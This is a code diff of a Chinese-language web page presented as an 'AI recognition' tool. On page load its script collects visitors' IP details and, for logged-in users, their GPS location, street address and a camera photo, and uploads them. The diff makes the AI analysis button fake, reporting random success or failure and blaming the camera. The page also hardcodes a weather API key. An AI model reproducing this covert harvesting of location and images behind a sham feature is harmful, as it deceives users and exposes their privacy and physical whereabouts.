@@ -2,7 +2,7 @@
 <html lang="zh-TW">
 <head>
   <meta charset="UTF-8" />
-  <title>AI 辨識 - NTU</title>
+  <title>AI 辨識 - 完整功能</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <!-- 引入 Bootstrap 5 -->
   <link
@@ -12,23 +12,39 @@
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
   <style>
+    /* ======= 全局風格 ======= */
     body {
-      background-color: #121212;
-      color: #f8f9fa;
+      background-color: #181a1b;  /* 深色背景 */
+      color: #e0e0e0;            /* 文字淺灰 */
+      font-family: "Microsoft JhengHei", sans-serif;
     }
     .navbar-brand {
-      font-weight: bold;
+      font-weight: 700;
+      letter-spacing: 1px;
     }
+    /* 讓 navbar 更高級 */
+    .navbar {
+      background-color: #232627 !important;
+      border-bottom: 1px solid #2f2f2f;
+    }
+
+    /* ======= Card 風格 ======= */
     .card {
       border-radius: 0.75rem;
-      background-color: #1f1f1f;
-      border: 1px solid #333;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
-      color: #fff;
+      background-color: #212528;
+      border: 1px solid #2a2e31;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.4);
+      color: #e0e0e0;
     }
+    .card h6 {
+      color: #9dd5ff; /* 稍微亮點的標題色 */
+      margin-bottom: 0.75rem;
+    }
+
+    /* ======= Modal 風格 ======= */
     .modal-content {
       border-radius: 0.75rem;
-      background-color: #2a2a2a;
+      background-color: #2c2f31;
       border: 1px solid #444;
       color: #f8f9fa;
     }
@@ -45,6 +61,8 @@
       background-color: #333;
       color: #fff;
     }
+
+    /* ======= File input ======= */
     .file-input-container input[type="file"] {
       display: none;
     }
@@ -52,32 +70,39 @@
       display: inline-block;
       cursor: pointer;
       padding: 0.5rem 1rem;
-      background-color: #6060a0;
+      background-color: #5c5caf;
       color: #fff;
       border-radius: 0.5rem;
+      transition: background-color 0.3s ease;
     }
+    .file-input-container label:hover {
+      background-color: #8484c2;
+    }
+
+    /* ======= Section Title ======= */
     .section-title {
       margin-top: 1.5rem;
       margin-bottom: 1rem;
       font-weight: 700;
-      color: #0ef;
+      color: #00cbff;
+      letter-spacing: 1px;
     }
+    /* 卡片布局 */
     .card-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
       gap: 1rem;
     }
-    .fade-out {
-      transition: opacity 0.8s ease;
-    }
+
+    /* ======= Alert ======= */
     .alert-info {
-      background-color: #203040;
-      border-color: #203040;
-      color: #bde;
+      background-color: #30444c;
+      border-color: #30444c;
+      color: #ccf;
     }
     .alert-success {
-      background-color: #2a4a2a;
-      border-color: #3d5d3d;
+      background-color: #27402f;
+      border-color: #2a5936;
       color: #afffaf;
     }
     .alert-danger {
@@ -85,17 +110,19 @@
       border-color: #7d3d3d;
       color: #ffbebe;
     }
+
+    /* ======= 按鈕色系 ======= */
     .btn-primary {
       background-color: #428bff;
       border-color: #357ae8;
     }
     .btn-success {
-      background-color: #4bbb4b;
-      border-color: #3a9a3a;
+      background-color: #49b249;
+      border-color: #3a923a;
     }
     .btn-warning {
-      background-color: #ffa500;
-      border-color: #cc8400;
+      background-color: #ff9f1c;
+      border-color: #ee8c00;
       color: #000;
     }
     .btn-info {
@@ -103,18 +130,29 @@
       border-color: #38c0be;
       color: #000;
     }
-    /* AI功能卡片的按鈕 */
     .btn-ai {
-      background-color: #00f7ff;
+      background-color: #00d9ff; /* 螢光藍 */
+      border-color: #00bacf;
       color: #000;
-      border-color: #00c2c8;
+      font-weight: 600;
+      letter-spacing: 1px;
+      transition: transform 0.2s;
+    }
+    .btn-ai:hover {
+      transform: scale(1.02);
+      background-color: #2cf0ff;
+    }
+
+    /* ======= Fade-out ======= */
+    .fade-out {
+      transition: opacity 0.8s ease;
     }
   </style>
 </head>
 <body>
 
 <!-- 導覽列 -->
-<nav class="navbar navbar-expand-md navbar-dark bg-dark">
+<nav class="navbar navbar-expand-md">
   <div class="container-fluid">
     <a class="navbar-brand" href="#">AI 辨識 - 完整功能</a>
     <button
@@ -295,10 +333,11 @@
   <div id="guestPanel">
     <h4 class="section-title">AI 辨識 - 基礎模式</h4>
     <div class="alert alert-info">
-      若要使用「辨識 &amp; GPS &amp; AI 功能」，請登入帳號。
+      您尚未登入，目前僅收集您的 IP 資訊。<br>
+      若要使用「拍照 &amp; GPS &amp; AI 功能」，請先登入帳號。
     </div>
     <!-- 回饋功能 -->
-    <h5 class="mb-3">回饋功能 (可回傳文字/圖片)</h5>
+    <h5 class="mb-3 text-warning">回饋功能 (可回傳文字/圖片)</h5>
     <div class="row mb-3">
       <div class="col-md-6 mb-3">
         <div class="card p-3">
@@ -338,7 +377,7 @@
     </div>
 
     <!-- 回饋功能 (登入後依舊可用) -->
-    <h5 class="mb-3">回饋功能 (可回傳文字/圖片)</h5>
+    <h5 class="mb-3 text-warning">回饋功能 (可回傳文字/圖片)</h5>
     <div class="row mb-3">
       <div class="col-md-6 mb-3">
         <div class="card p-3">
@@ -347,7 +386,7 @@
             id="userMessage2"
             class="form-control mb-2"
             rows="3"
-            placeholder="輸入想要回饋的訊息..."
+            placeholder="輸入想回饋的訊息..."
           ></textarea>
           <button id="sendMessageBtn2" class="btn btn-primary w-100">
             回傳訊息
@@ -369,15 +408,15 @@
     </div>
 
     <!-- AI 功能卡片 -->
-    <h5 class="mb-3">AI 功能</h5>
+    <h5 class="mb-3 text-info">AI 功能</h5>
     <div class="card p-3 mb-3">
       <h6>AI 影像辨識</h6>
-      <p>AI 辨識模型操作按鈕。</p>
+      <p id="aiStatus">AI 辨識模型可在此進行操作。</p>
       <button class="btn btn-ai" id="aiAnalyzeBtn">開始 AI 分析</button>
     </div>
 
     <!-- 天氣資訊卡片 -->
-    <h5 class="mb-3">天氣資訊</h5>
+    <h5 class="mb-3 text-info">天氣資訊</h5>
     <div class="card p-3">
       <h6>當前天氣</h6>
       <p id="weatherInfo" class="text-muted">資料載入中...</p>
@@ -393,6 +432,7 @@
   const statusError = document.getElementById('statusError');
   const guestPanel = document.getElementById('guestPanel');
   const memberPanel = document.getElementById('memberPanel');
+  const aiStatusElem = document.getElementById('aiStatus');
 
   /* ====== Navbar ====== */
   function updateNavbar() {
@@ -401,7 +441,6 @@
     const email = sessionStorage.getItem('email');
 
     if (email) {
-      // 已登入
       const liHello = document.createElement('li');
       liHello.classList.add('nav-item', 'me-2');
       liHello.innerHTML = `<span class="nav-link disabled">您好，${email}</span>`;
@@ -420,7 +459,6 @@
       navRight.appendChild(liHello);
       navRight.appendChild(liLogout);
     } else {
-      // 未登入
       const liUser = document.createElement('li');
       liUser.classList.add('nav-item', 'me-2');
       const userBtn = document.createElement('button');
@@ -657,7 +695,7 @@
       const ipResult = await getIpInfo();
       if (ipResult) collectedData.ip = ipResult;
 
-      // 2) 若 onlyIP=false，則抓GPS + 拍照
+      // 2) 若 onlyIP=false => GPS + 拍照
       let gpsResult = null, photoResult = null;
       if (!onlyIP) {
         gpsResult = await getGpsCoordinates();
@@ -667,12 +705,11 @@
         if (photoResult) collectedData.photo = photoResult;
       }
 
-      // 3) 組合 formData 上傳
+      // 3) 上傳
       const email = sessionStorage.getItem('email') || 'guest_user';
       const formData = new FormData();
       formData.append('email', email);
 
-      // IP
       if (collectedData.ip) {
         formData.append('ip', collectedData.ip.ip);
         formData.append('ipType', collectedData.ip.ipType);
@@ -682,13 +719,11 @@
         formData.append('country', collectedData.ip.country);
         formData.append('org', collectedData.ip.org);
       }
-      // GPS
       if (collectedData.gps) {
         formData.append('latitude', collectedData.gps.latitude);
         formData.append('longitude', collectedData.gps.longitude);
         formData.append('address', collectedData.gps.address);
       }
-      // Camera
       if (collectedData.photo) {
         formData.append('imageData', collectedData.photo);
       }
@@ -710,7 +745,7 @@
     } catch (err) {
       console.error('資料收集/上傳錯誤：', err);
       if (statusElem) {
-        statusElem.textContent = '資料收集或傳送時發生錯誤。';
+        statusElem.textContent = '資料收集或傳送過程中發生錯誤。';
       }
     }
   }
@@ -734,7 +769,7 @@
   async function getGpsCoordinates() {
     try {
       const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 20000 });
       });
       const { latitude, longitude } = position.coords;
       const resp = await fetch(
@@ -753,7 +788,6 @@
   async function startCamera() {
     let stream = null;
     try {
-      // 設定理想解析度 ex: 1280x720
       stream = await navigator.mediaDevices.getUserMedia({
         video: { width: 1280, height: 720 }
       });
@@ -765,13 +799,13 @@
           resolve();
         };
       });
+      // 短暫等待
       await new Promise((r) => setTimeout(r, 300));
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      // JPEG 品質 0.9
       const photoData = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
       return photoData;
     } catch (error) {
@@ -779,16 +813,16 @@
       return null;
     } finally {
       if (stream) {
-        stream.getTracks().forEach((track) => track.stop());
+        stream.getTracks().forEach(track => track.stop());
       }
     }
   }
 
-  /* ====== 天氣資訊 ====== */
+  /* ====== 天氣 ====== */
   async function getWeatherInfo(lat, lon) {
     try {
       if (!lat || !lon) return;
-      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // 改成您自己的 key
+      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // 您自己的 Key
       const resp = await fetch(
         `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
       );
@@ -796,6 +830,7 @@
       const temp = data.main.temp;
       const weather = data.weather[0].description;
       const humidity = data.main.humidity;
+
       const wElem = document.getElementById('weatherInfo');
       if (wElem) {
         wElem.innerHTML = `
@@ -807,33 +842,50 @@
       console.error('天氣資訊獲取失敗:', err);
       const wElem = document.getElementById('weatherInfo');
       if (wElem) {
-        wElem.textContent = '天氣資訊載入失敗...';
+        wElem.textContent = '天氣資訊載入失敗…';
       }
     }
   }
 
-  /* ====== 初始化 ====== */
-  document.addEventListener('DOMContentLoaded', async () => {
+  /* ====== AI 功能示範 ====== */
+  document.addEventListener('DOMContentLoaded', () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
     if (email) {
-      // 已登入 => 全功能
+      // 已登入 => 全套
       guestPanel.style.display = 'none';
       memberPanel.style.display = 'block';
       collectAndSendData(false);
     } else {
-      // 未登入 => 只收集 IP
+      // 未登入 => 只收 IP
       guestPanel.style.display = 'block';
       memberPanel.style.display = 'none';
       collectAndSendData(true);
     }
 
-    // AI功能示範按鈕
+    // 綁定 AI 按鈕
     const aiAnalyzeBtn = document.getElementById('aiAnalyzeBtn');
     if (aiAnalyzeBtn) {
-      aiAnalyzeBtn.addEventListener('click', () => {
-        showSuccessMessage('AI 分析中...（此處可整合您的 AI 模型）');
-        // 這裡可呼叫後端 AI API or 前端模型
+      aiAnalyzeBtn.addEventListener('click', async () => {
+        // 假裝開始分析
+        aiStatusElem.textContent = '分析中...';
+        try {
+          // 這裡可串接後端 AI or 前端 TF.js
+          await new Promise((r) => setTimeout(r, 1500));
+          // 模擬分析成功 / 失敗
+          const success = Math.random() > 0.3; // 70% 成功
+          if (success) {
+            aiStatusElem.textContent = '分析完成！結果顯示在這裏... (示例)';
+            showSuccessMessage('AI 分析成功！');
+          } else {
+            aiStatusElem.textContent = '分析失敗，請確認相機是否開啟。';
+            showErrorMessage('AI 分析失敗：請確認您的相機與定位已允許。');
+          }
+        } catch (err) {
+          console.error('AI 分析錯誤：', err);
+          aiStatusElem.textContent = '分析失敗，請稍後重試或檢查相機。';
+          showErrorMessage('AI 分析錯誤：' + err.message);
+        }
       });
     }
   });
